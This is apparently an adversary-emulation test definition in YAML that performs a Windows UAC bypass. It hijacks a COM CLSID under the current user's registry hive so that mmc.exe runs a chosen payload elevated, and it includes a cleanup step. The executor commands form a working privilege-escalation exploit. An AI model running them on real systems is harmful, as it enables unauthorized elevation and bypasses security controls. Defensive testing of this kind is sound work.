- name: UAC Bypass via MMC CLSID Hijack
  auto_generated_guid: 2c413a63-df90-4fd4-b91f-487db68e1905
  description: |
    Hijacks a COM CLSID object under HKCU to gain elevated execution via mmc.exe.
  supported_platforms:
    - windows
  input_arguments:
    payload_path:
      description: Path to the payload executable to run as elevated.
      type: path
      default: C:\Windows\System32\notepad.exe
  executor:
    command: |
      reg add "HKCU\Software\Classes\CLSID\{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\LocalServer32" /d "#{payload_path}" /f
      timeout /t 3
      mmc.exe
    cleanup_command: |
      reg delete "HKCU\Software\Classes\CLSID\{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" /f
    name: command_prompt
